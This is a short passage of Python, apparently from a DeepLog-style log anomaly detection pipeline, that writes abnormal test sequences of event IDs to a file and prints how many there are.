    # df_abnormal["EventId"] = df_abnormal["EventId"].progress_apply(lambda e: event_index_map[e] if event_index_map.get(e) else UNK)
    deeplog_file_generator(
        os.path.join(output_dir, "test_abnormal"), df_abnormal, ["EventId"]
    )
    print("test abnormal size {}".format(len(df_abnormal)))
